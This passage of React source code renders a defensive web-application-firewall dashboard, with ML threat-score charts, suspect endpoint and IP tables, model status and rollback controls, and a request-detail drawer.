                        name === 'avg_score' ? `${(value * 100).toFixed(1)}%` : value,
                        name === 'avg_score' ? 'Avg Threat' : 'Request Count'
                      ]}
                    />
                    {/* Request Count Bar in the background */}
                    <Bar
                      yAxisId="right"
                      dataKey="count"
                      name="Request Count"
                      fill="rgba(99, 102, 241, 0.12)"
                      stroke="rgba(99, 102, 241, 0.35)"
                      strokeWidth={1}
                      barSize={18}
                      radius={[4, 4, 0, 0]}
                    />
                    {/* Avg Threat Score Area in the foreground */}
                    <Area
                      yAxisId="left"
                      type="monotone"
                      dataKey="avg_score"
                      name="Avg Threat"
                      stroke="var(--danger-color)"
                      strokeWidth={2.5}
                      fillOpacity={1}
                      fill="url(#mlThreatScoreGrad)"
                    />
                  </ComposedChart>
                </ResponsiveContainer>
              ) : (
                <div style={{ display: 'flex', height: '100%', alignItems: 'center', justifyContent: 'center', color: 'var(--text-secondary)', fontSize: '14px' }}>
                  Waiting for ML evaluation requests to compile graph data...
                </div>
              )}
            </div>
          </div>

          {/* Mitigation Actions Pie */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 4' }}>
            <div className="card-title">
              <Brain size={18} color="var(--accent-color)" />
              Mitigation Action Shares
            </div>

            <div className="chart-container" style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
              <div style={{ width: '100%', height: '160px' }}>
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={displayPieData}
                      cx="50%"
                      cy="50%"
                      innerRadius={45}
                      outerRadius={65}
                      paddingAngle={3}
                      dataKey="value"
                    >
                      {displayPieData.map((entry, index) => (
                        <Cell key={`cell-${index}`} fill={entry.color} />
                      ))}
                    </Pie>
                    <RechartsTooltip
                      contentStyle={{
                        background: 'var(--bg-secondary)',
                        border: '1px solid var(--border-color)',
                        borderRadius: '8px',
                        color: 'var(--text-primary)',
                        fontFamily: 'inherit'
                      }}
                    />
                  </PieChart>
                </ResponsiveContainer>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px 16px', width: '100%', marginTop: '16px', fontSize: '12px' }}>
                {Object.entries(stats.decision_breakdown).map(([key, val]) => (
                  <div key={key} style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--text-secondary)' }}>
                    <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: decisionColors[key] }} />
                    <span style={{ textTransform: 'capitalize' }}>{key.replace('_', ' ')}:</span>
                    <strong style={{ color: 'var(--text-primary)', marginLeft: 'auto' }}>{val}</strong>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Leaderboards */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6' }}>
            <div className="card-title">
              <Globe size={18} color="var(--accent-color)" />
              Highly Suspect Target Endpoints
            </div>

            <div style={{ overflow: 'hidden' }}>
              {stats.top_anomalous_uris.length > 0 ? (
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
                  <thead>
                    <tr style={{ borderBottom: '1px solid var(--border-color)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                      <th style={{ padding: '8px 0', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>URI Path</th>
                      <th style={{ padding: '8px 0', textAlign: 'center', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Count</th>
                      <th style={{ padding: '8px 0', textAlign: 'right', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Avg Threat</th>
                    </tr>
                  </thead>
                  <tbody>
                    {stats.top_anomalous_uris.map((item, idx) => (
                      <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)', color: 'var(--text-primary)' }}>
                        <td style={{ padding: '10px 0', fontFamily: 'monospace', color: 'var(--accent-color)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={item.uri}>
                          {item.uri}
                        </td>
                        <td style={{ padding: '10px 0', textAlign: 'center' }}>{item.count}</td>
                        <td style={{ padding: '10px 0', textAlign: 'right', color: item.avg_score >= 0.7 ? 'var(--danger-color)' : 'var(--warning-color)', fontWeight: 600 }}>
                          {(item.avg_score * 100).toFixed(0)}%
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              ) : (
                <div style={{ padding: '16px 0', color: 'var(--text-secondary)', textAlign: 'center' }}>No endpoints evaluated yet.</div>
              )}
            </div>
          </div>

          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6' }}>
            <div className="card-title">
              <Server size={18} color="var(--accent-color)" />
              Top Suspect Client IPs
            </div>

            <div style={{ overflow: 'hidden' }}>
              {stats.top_anomalous_ips.length > 0 ? (
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
                  <thead>
                    <tr style={{ borderBottom: '1px solid var(--border-color)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                      <th style={{ padding: '8px 0', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>IP Address</th>
                      <th style={{ padding: '8px 0', textAlign: 'center', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Count</th>
                      <th style={{ padding: '8px 0', textAlign: 'right', fontSize: '12px', textTransform: 'uppercase', fontWeight: 500 }}>Avg Threat</th>
                    </tr>
                  </thead>
                  <tbody>
                    {stats.top_anomalous_ips.map((item, idx) => (
                      <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)', color: 'var(--text-primary)' }}>
                        <td style={{ padding: '10px 0', fontFamily: 'monospace', color: 'var(--accent-color)' }}>{item.ip}</td>
                        <td style={{ padding: '10px 0', textAlign: 'center' }}>{item.count}</td>
                        <td style={{ padding: '10px 0', textAlign: 'right', color: item.avg_score >= 0.7 ? 'var(--danger-color)' : 'var(--warning-color)', fontWeight: 600 }}>
                          {(item.avg_score * 100).toFixed(0)}%
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              ) : (
                <div style={{ padding: '16px 0', color: 'var(--text-secondary)', textAlign: 'center' }}>No suspicious IPs evaluated yet.</div>
              )}
            </div>
          </div>

          {/* Live Inferences Logs */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 12' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px', flexWrap: 'wrap', gap: '12px' }}>
              <div className="card-title" style={{ marginBottom: 0 }}>
                <ShieldAlert size={18} color="var(--danger-color)" />
                Recent AI/ML Evaluation Inferences
              </div>

              <div style={{ display: 'flex', gap: '12px' }}>
                <input
                  type="text"
                  placeholder="Search by URI, IP, variables..."
                  value={searchQuery}
                  onChange={(e) => {
                    setSearchQuery(e.target.value);
                    setPage(1);
                  }}
                  className="search-input"
                  style={{ width: '220px', paddingLeft: '14px' }}
                />

                <select
                  value={filterDecision}
                  onChange={(e) => {
                    setFilterDecision(e.target.value);
                    setPage(1);
                  }}
                  className="filter-select"
                >
                  <option value="">All Actions</option>
                  <option value="allow">Allow Only</option>
                  <option value="log">Log Only</option>
                  <option value="rate_limit">Rate Limit Only</option>
                  <option value="block">Block Only</option>
                </select>
              </div>
            </div>

            {/* Logs Table */}
            <div className="logs-table-wrapper">
              <table className="logs-table">
                <thead>
                  <tr>
                    <th>Timestamp</th>
                    <th>Client IP</th>
                    <th>Request Details</th>
                    <th style={{ textAlign: 'center' }}>XGB Prob</th>
                    <th style={{ textAlign: 'center' }}>Isolation Score</th>
                    <th style={{ textAlign: 'center' }}>Threat Score</th>
                    <th style={{ textAlign: 'center' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {logs.length > 0 ? (
                    logs.map((log) => (
                      <tr
                        key={log.id}
                        onClick={() => setSelectedLog(log)}
                        style={{ cursor: 'pointer' }}
                      >
                        <td style={{ color: 'var(--text-secondary)', whiteSpace: 'nowrap' }}>
                          {formatLocalTime(log.timestamp)}
                        </td>
                        <td style={{ fontFamily: 'monospace', fontWeight: 500 }}>{log.remote_addr}</td>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                            <span style={{ fontSize: '10px', fontWeight: 700, padding: '2px 6px', borderRadius: '4px', background: 'rgba(255,255,255,0.05)', color: 'var(--text-secondary)' }}>{log.method}</span>
                            <span style={{ fontFamily: 'monospace', color: 'var(--accent-color)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={log.uri}>{log.uri}</span>
                          </div>
                        </td>
                        <td style={{ textAlign: 'center', color: log.xgb_prob >= 0.7 ? 'var(--danger-color)' : 'var(--text-secondary)' }}>
                          {(log.xgb_prob * 100).toFixed(1)}%
                        </td>
                        <td style={{ textAlign: 'center', color: log.iso_score <= -0.1 ? 'var(--warning-color)' : 'var(--text-secondary)' }}>
                          {log.iso_score.toFixed(3)}
                        </td>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                            <div style={{ width: '48px', height: '6px', borderRadius: '3px', background: 'rgba(255,255,255,0.05)', overflow: 'hidden' }}>
                              <div style={{ height: '100%', width: `${log.threat_score * 100}%`, background: decisionColors[log.decision] }} />
                            </div>
                            <strong style={{ fontSize: '12px', color: decisionColors[log.decision] }}>{(log.threat_score * 100).toFixed(0)}%</strong>
                          </div>
                        </td>
                        <td style={{ textAlign: 'center' }}>
                          <span style={{
                            display: 'inline-block',
                            padding: '3px 8px',
                            borderRadius: '12px',
                            fontSize: '11px',
                            fontWeight: 600,
                            textTransform: 'uppercase',
                            background: `${decisionColors[log.decision]}1A`,
                            color: decisionColors[log.decision],
                            border: `1px solid ${decisionColors[log.decision]}40`
                          }}>
                            {log.decision.replace('_', ' ')}
                          </span>
                        </td>
                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan="7" style={{ padding: 0 }}>
                        {loading ? (
                          <div style={{ textAlign: 'center', padding: '24px 0', color: 'var(--text-secondary)' }}>
                            Syncing ML engine telemetry database...
                          </div>
                        ) : (
                          <NoMLEventsEmptyState />
                        )}
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>

            {/* Pagination */}
            {totalLogs > size && (
              <div className="pagination-container">
                <span className="pagination-info">
                  Showing {((page - 1) * size) + 1} - {Math.min(page * size, totalLogs)} of {totalLogs} events
                </span>
                <div style={{ display: 'flex', gap: '8px' }}>
                  <button
                    disabled={page === 1}
                    onClick={() => setPage(page - 1)}
                    className="pagination-btn"
                  >
                    Prev
                  </button>
                  <button
                    disabled={page * size >= totalLogs}
                    onClick={() => setPage(page + 1)}
                    className="pagination-btn"
                  >
                    Next
                  </button>
                </div>
              </div>
            )}
          </div>
        </>
      ) : (
        <>
          {/* Models Status Cards */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Brain size={18} color="var(--accent-color)" />
              <span>Supervised Model: XGBoost Classifier</span>
              <HelpText>
                XGBoost is a machine learning model trained on known attack patterns. It analyzes incoming requests and predicts the probability that they are malicious based on historical data. Higher accuracy means better threat detection.
              </HelpText>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '13px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Model Accuracy Gate</div>
                  <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--success-color)', marginTop: '4px' }}>
                    {modelInfo?.model_metadata?.xgboost?.accuracy ? `${(modelInfo.model_metadata.xgboost.accuracy * 100).toFixed(1)}%` : 'N/A'}
                  </div>
                </div>
                <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Training Samples</div>
                  <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--text-primary)', marginTop: '4px' }}>
                    {modelInfo?.model_metadata?.xgboost?.sample_count?.toLocaleString() || 'N/A'}
                  </div>
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', borderTop: '1px solid var(--border-subtle)', paddingTop: '10px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}><span style={{ color: 'var(--text-secondary)' }}>Model Version:</span> <strong style={{ color: 'var(--text-primary)' }}>v{modelInfo?.model_metadata?.xgboost?.version || 'N/A'}</strong></div>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}><span style={{ color: 'var(--text-secondary)' }}>Last Trained:</span> <strong style={{ color: 'var(--text-primary)', fontFamily: 'var(--font-mono)', fontSize: '12px' }}>{modelInfo?.model_metadata?.xgboost?.training_date ? formatLocalTime(modelInfo.model_metadata.xgboost.training_date) : 'N/A'}</strong></div>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}><span style={{ color: 'var(--text-secondary)' }}>Balanced Acc:</span> <strong style={{ color: 'var(--text-primary)' }}>{modelInfo?.model_metadata?.xgboost?.balanced_accuracy ? `${(modelInfo.model_metadata.xgboost.balanced_accuracy * 100).toFixed(1)}%` : 'N/A'}</strong></div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '2px', borderTop: '1px solid var(--border-subtle)', paddingTop: '6px', marginTop: '4px' }}>
                  <span style={{ color: 'var(--text-secondary)', fontSize: '11px' }}>Notes:</span>
                  <p style={{ fontStyle: 'italic', fontSize: '11px', color: 'var(--text-primary)', margin: 0 }}>{modelInfo?.model_metadata?.xgboost?.notes || 'No description notes available.'}</p>
                </div>
              </div>
            </div>
          </div>

          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div className="card-title" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Brain size={18} color="var(--ml-color)" />
              <span>Anomaly Detector: Isolation Forest</span>
              <HelpText>
                Isolation Forest detects unusual traffic patterns without needing labeled attack data. It identifies requests that deviate significantly from normal behavior, catching zero-day attacks and novel threats that rule-based systems might miss.
              </HelpText>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '13px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Type Classification</div>
                  <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--ml-color)', marginTop: '4px' }}>Unsupervised</div>
                </div>
                <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Training Samples</div>
                  <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--text-primary)', marginTop: '4px' }}>
                    {modelInfo?.model_metadata?.isolation_forest?.sample_count?.toLocaleString() || 'N/A'}
                  </div>
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', borderTop: '1px solid var(--border-subtle)', paddingTop: '10px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}><span style={{ color: 'var(--text-secondary)' }}>Model Version:</span> <strong style={{ color: 'var(--text-primary)' }}>v{modelInfo?.model_metadata?.isolation_forest?.version || 'N/A'}</strong></div>
                <div style={{ display: 'flex', justifyContent: 'space-between' }}><span style={{ color: 'var(--text-secondary)' }}>Last Trained:</span> <strong style={{ color: 'var(--text-primary)', fontFamily: 'var(--font-mono)', fontSize: '12px' }}>{modelInfo?.model_metadata?.isolation_forest?.training_date ? formatLocalTime(modelInfo.model_metadata.isolation_forest.training_date) : 'N/A'}</strong></div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '2px', borderTop: '1px solid var(--border-subtle)', paddingTop: '6px', marginTop: '4px' }}>
                  <span style={{ color: 'var(--text-secondary)', fontSize: '11px' }}>Notes:</span>
                  <p style={{ fontStyle: 'italic', fontSize: '11px', color: 'var(--text-primary)', margin: 0 }}>{modelInfo?.model_metadata?.isolation_forest?.notes || 'No description notes available.'}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Explainability Feature Importance & Rollback Row */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div className="card-title">
              <Brain size={18} color="var(--accent-color)" />
              Explainability — Model Features Contribution
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxHeight: '340px', overflowY: 'auto', paddingRight: '4px' }}>
              {featureImportance.length > 0 ? (
                featureImportance.map((item, idx) => (
                  <div key={idx} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', color: 'var(--text-primary)' }}>
                      <span style={{ fontWeight: 500 }}>{item.feature}</span>
                      <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-color)', fontWeight: 600 }}>{(item.importance * 100).toFixed(1)}%</span>
                    </div>
                    <div style={{ width: '100%', height: '8px', background: 'rgba(255,255,255,0.03)', borderRadius: '4px', overflow: 'hidden' }}>
                      <div style={{ width: `${item.importance * 100}%`, height: '100%', background: 'linear-gradient(90deg, var(--accent-dim), var(--accent-color))', borderRadius: '4px', boxShadow: '0 0 6px var(--accent-glow)' }}></div>
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ textAlign: 'center', padding: '30px', color: 'var(--text-secondary)' }}>No feature importance telemetry loaded.</div>
              )}
            </div>
          </div>

          <div className="chart-card glass-panel" style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div className="card-title">
              <Clock size={18} color="var(--accent-color)" />
              Historical Backups & Rollback Control
            </div>
            <div style={{ overflowX: 'auto', border: '1px solid var(--border-color)', borderRadius: '8px', maxHeight: '340px' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: 'var(--bg-tertiary)', borderBottom: '1px solid var(--border-color)', color: 'var(--text-primary)', fontFamily: 'var(--font-display)' }}>
                    <th style={{ padding: '10px' }}>Backup Date</th>
                    <th style={{ padding: '10px', textAlign: 'center' }}>XGB</th>
                    <th style={{ padding: '10px', textAlign: 'center' }}>ISO</th>
                    <th style={{ padding: '10px', textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {backups.length > 0 ? (
                    backups.map((bk, idx) => (
                      <tr key={idx} style={{ borderBottom: '1px solid var(--border-subtle)', color: 'var(--text-primary)' }}>
                        <td style={{ padding: '10px', fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--text-secondary)' }}>{bk.formatted_date}</td>
                        <td style={{ padding: '10px', textAlign: 'center' }}>
                          <span style={{ fontSize: '10px', padding: '1px 5px', borderRadius: '3px', background: bk.xgboost ? 'var(--success-bg)' : 'var(--danger-bg)', color: bk.xgboost ? 'var(--success-color)' : 'var(--danger-color)' }}>
                            {bk.xgboost ? 'Ready' : 'Missing'}
                          </span>
                        </td>
                        <td style={{ padding: '10px', textAlign: 'center' }}>
                          <span style={{ fontSize: '10px', padding: '1px 5px', borderRadius: '3px', background: bk.isolation_forest ? 'var(--success-bg)' : 'var(--danger-bg)', color: bk.isolation_forest ? 'var(--success-color)' : 'var(--danger-color)' }}>
                            {bk.isolation_forest ? 'Ready' : 'Missing'}
                          </span>
                        </td>
                        <td style={{ padding: '10px', textAlign: 'right' }}>
                          <button
                            disabled={rollingBack}
                            onClick={() => handleRollback(bk.timestamp)}
                            className="action-btn-inspect"
                            style={{ padding: '3px 8px', fontSize: '11px' }}
                          >
                            Rollback
                          </button>
                        </td>
                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan="4" style={{ textAlign: 'center', padding: '20px', color: 'var(--text-secondary)' }}>No backups available.</td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>

          {/* Retrainer Console Terminal */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 12', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
              <div className="card-title" style={{ marginBottom: 0 }}>
                <Activity size={18} color="var(--accent-color)" />
                ML Retrainer Console Log
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Status:</span>
                <span style={{
                  padding: '2px 8px', borderRadius: '12px', fontSize: '11px', fontWeight: 600, textTransform: 'uppercase',
                  background: retrainStatus.status === 'running' ? 'var(--warning-bg)' : retrainStatus.status === 'success' ? 'var(--success-bg)' : 'var(--bg-tertiary)',
                  color: retrainStatus.status === 'running' ? 'var(--warning-color)' : retrainStatus.status === 'success' ? 'var(--success-color)' : 'var(--text-secondary)',
                  border: retrainStatus.status === 'running' ? '1px solid rgba(255, 149, 0, 0.2)' : retrainStatus.status === 'success' ? '1px solid rgba(0, 255, 157, 0.2)' : '1px solid var(--border-color)'
                }}>
                  {retrainStatus.status}
                </span>
                <button
                  onClick={handleTriggerRetrain}
                  disabled={retrainStatus.status === 'running' || triggeringRetrain}
                  className="modal-btn primary"
                  style={{ padding: '6px 14px', borderRadius: '8px' }}
                >
                  {retrainStatus.status === 'running' ? (
                    <>
                      <Activity className="animate-spin" size={14} /> Training...
                    </>
                  ) : (
                    <>
                      <Brain size={14} /> Retrain ML Models
                    </>
                  )}
                </button>
              </div>
            </div>
            <pre style={{
              background: 'var(--bg-void)',
              color: 'var(--success-color)',
              border: '1px solid var(--border-color)',
              padding: '16px',
              borderRadius: '8px',
              fontFamily: 'var(--font-mono)',
              fontSize: '11px',
              maxHeight: '260px',
              overflowY: 'auto',
              whiteSpace: 'pre-wrap',
              wordBreak: 'break-all'
            }}>
              {retrainStatus.logs || "Console output empty. Trigger retraining to view log output."}
            </pre>
          </div>
        </>
      )}

      {/* View Payload Detail Modal */}
      {selectedLog && createPortal(
        <div className="log-drawer-overlay" onClick={() => setSelectedLog(null)}>
          <div className="log-drawer" onClick={(e) => e.stopPropagation()}>
            {/* Header */}
            <div className="log-drawer-header">
              <div className="log-drawer-title">
                <Brain size={18} color="var(--accent-color)" />
                Threat Evaluation
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--text-muted)', fontWeight: 400 }}>
                  {selectedLog.remote_addr}
                </span>
              </div>
              <button className="log-drawer-close" onClick={() => setSelectedLog(null)}><X size={16} /></button>
            </div>

            {/* Tabs */}
            <div className="log-drawer-tabs">
              <span className={`log-drawer-tab ${modalActiveTab === 'scores' ? 'active' : ''}`} onClick={() => setModalActiveTab('scores')}>Payload Details</span>
              <span className={`log-drawer-tab ${modalActiveTab === 'raw' ? 'active' : ''}`} onClick={() => setModalActiveTab('raw')}>CyberSentinel Engine Log</span>
            </div>

            {/* Body */}
            <div className="log-drawer-body">
              {modalActiveTab === 'scores' ? (
                <>
                  {/* Info grid */}
                  <div>
                    <div className="drawer-section-title">Request Metadata</div>
                    <div className="drawer-info-grid">
                      <div className="drawer-info-cell">
                        <div className="drawer-info-label">Timestamp</div>
                        <div className="drawer-info-value" style={{ fontSize: '11px' }}>{formatLocalTime(selectedLog.timestamp)}</div>
                      </div>
                      <div className="drawer-info-cell">
                        <div className="drawer-info-label">Client IP</div>
                        <div className="drawer-info-value" style={{ color: 'var(--accent-color)' }}>{selectedLog.remote_addr}</div>
                      </div>
                      <div className="drawer-info-cell">
                        <div className="drawer-info-label">Method</div>
                        <div className="drawer-info-value">{selectedLog.method}</div>
                      </div>
                      <div className="drawer-info-cell">
                        <div className="drawer-info-label">Body Length</div>
                        <div className="drawer-info-value">{selectedLog.body_len} bytes</div>
                      </div>
                    </div>
                  </div>

                  {/* URI */}
                  <div>
                    <div className="drawer-section-title">Target URI</div>
                    <div className="drawer-code-block" style={{ color: 'var(--accent-color)' }}>{selectedLog.uri}</div>
                  </div>

                  {/* Args */}
                  {selectedLog.args && (
                    <div>
                      <div className="drawer-section-title">Payload Arguments</div>
                      <div className="drawer-code-block" style={{ color: 'var(--warning-color)' }}>{selectedLog.args}</div>
                    </div>
                  )}

                  {/* Matched vars */}
                  {selectedLog.matched_vars && (
                    <div>
                      <div className="drawer-section-title">OWASP CRS Matched Variables</div>
                      <div className="drawer-code-block" style={{ color: 'var(--danger-color)' }}>{selectedLog.matched_vars}</div>
                    </div>
                  )}

                  {/* ML scores */}
                  <div>
                    <div className="drawer-section-title">ML Diagnostics Vector</div>
                    <div className="drawer-ml-grid">
                      <div className="drawer-ml-cell">
                        <div className="drawer-ml-label">XGBoost Prob</div>
                        <div className="drawer-ml-value">{(selectedLog.xgb_prob * 100).toFixed(1)}%</div>
                      </div>
                      <div className="drawer-ml-cell">
                        <div className="drawer-ml-label">Isolation Forest</div>
                        <div className="drawer-ml-value">{selectedLog.iso_score?.toFixed(4)}</div>
                      </div>
                      <div className="drawer-ml-cell">
                        <div className="drawer-ml-label">CRS Anomaly</div>
                        <div className="drawer-ml-value">{selectedLog.crs_score}</div>
                      </div>
                      <div className="drawer-ml-cell">
                        <div className="drawer-ml-label">Redis IP Rep</div>
                        <div className="drawer-ml-value" style={{ fontSize: '14px' }}>{selectedLog.redis_rep} pts</div>
                      </div>
                    </div>
                  </div>

                  {/* Reconstructed request */}
                  <div>
                    <div className="drawer-section-title">Reconstructed HTTP Signature</div>
                    <div className="drawer-code-block" style={{ color: 'var(--text-secondary)', fontSize: '11px' }}>
                      {`${selectedLog.method} ${selectedLog.uri}${selectedLog.args ? `?${selectedLog.args}` : ''} HTTP/1.1\n` +
                        `Host: localhost\n` +
                        (selectedLog.ua ? `User-Agent: ${selectedLog.ua}\n` : '') +
                        (selectedLog.ct ? `Content-Type: ${selectedLog.ct}\n` : '') +
                        (selectedLog.body_len ? `Content-Length: ${selectedLog.body_len}\n` : '')}
                    </div>
                  </div>

                  {/* Full JSON */}
                  <div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                      <div className="drawer-section-title" style={{ marginBottom: 0 }}>Full Telemetry Record</div>
                      <button className="pagination-btn" onClick={handleCopy}
                        style={{ padding: '4px 10px', fontSize: '11px', display: 'flex', alignItems: 'center', gap: '4px', margin: 0 }}>
                        {copied ? <Check size={13} color="var(--success-color)" /> : <Copy size={13} />}
                        <span>{copied ? 'Copied!' : 'Copy JSON'}</span>
                      </button>
                    </div>
                    <HighlightedJson json={selectedLog} />
                  </div>
                </>
              ) : (
                <>
                  {loadingCorrelated ? (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: '12px', color: 'var(--text-secondary)' }}>
                      <Activity className="animate-spin" size={24} color="var(--accent-color)" />
                      <span>Syncing correlated CyberSentinel Engine raw logs...</span>
                    </div>
                  ) : correlatedLog ? (
                    <>
                      <div>
                        <div className="drawer-section-title">Event Metadata</div>
                        <div className="drawer-info-grid">
                          <div className="drawer-info-cell">
                            <div className="drawer-info-label">Timestamp</div>
                            <div className="drawer-info-value" style={{ fontSize: '11px' }}>{formatLocalTime(correlatedLog.timestamp)}</div>
                          </div>
                          <div className="drawer-info-cell">
                            <div className="drawer-info-label">Client IP</div>
                            <div className="drawer-info-value" style={{ color: 'var(--accent-color)' }}>{correlatedLog.client_ip}</div>
                          </div>
                          <div className="drawer-info-cell">
                            <div className="drawer-info-label">Severity</div>
                            <div className="drawer-info-value" style={{ color: correlatedLog.severity === 'Critical' || correlatedLog.severity === 'High' ? 'var(--danger-color)' : 'var(--warning-color)' }}>{correlatedLog.severity}</div>
                          </div>
                          <div className="drawer-info-cell">
                            <div className="drawer-info-label">Attack Category</div>
                            <div className="drawer-info-value">{correlatedLog.attack_type}</div>
                          </div>
                          {correlatedLog.rule_id && (
                            <div className="drawer-info-cell">
                              <div className="drawer-info-label">Rule ID</div>
                              <div className="drawer-info-value" style={{ color: 'var(--accent-color)' }}>{correlatedLog.rule_id}</div>
                            </div>
                          )}
                          {correlatedLog.hostname && (
                            <div className="drawer-info-cell">
                              <div className="drawer-info-label">Host Target</div>
                              <div className="drawer-info-value">{correlatedLog.hostname}</div>
                            </div>
                          )}
                        </div>
                      </div>
                      {correlatedLog.message && (
                        <div>
                          <div className="drawer-section-title">Rule Message</div>
                          <div className="drawer-code-block" style={{ color: 'var(--text-primary)', fontStyle: 'italic' }}>{correlatedLog.message}</div>
                        </div>
                      )}
                      <div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                          <div className="drawer-section-title" style={{ marginBottom: 0 }}>Raw Audit Log JSON</div>
                          <button className="pagination-btn" onClick={handleCopyRaw}
                            style={{ padding: '4px 10px', fontSize: '11px', display: 'flex', alignItems: 'center', gap: '4px', margin: 0 }}>
                            {copiedRaw ? <Check size={13} color="var(--success-color)" /> : <Copy size={13} />}
                            <span>{copiedRaw ? 'Copied!' : 'Copy JSON'}</span>
                          </button>
                        </div>
                        <HighlightedJson json={correlatedLog.raw_log || correlatedLog} />
                      </div>
                    </>
                  ) : (
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: '10px', color: 'var(--text-secondary)' }}>
                      <AlertTriangleIcon size={28} color="var(--warning-color)" />
                      <span style={{ textAlign: 'center' }}>No matching CyberSentinel Engine audit logs found.<br /><span style={{ fontSize: '12px', opacity: 0.7 }}>(This clean request bypassed CyberSentinel Engine block/log thresholds).</span></span>
                    </div>
                  )}
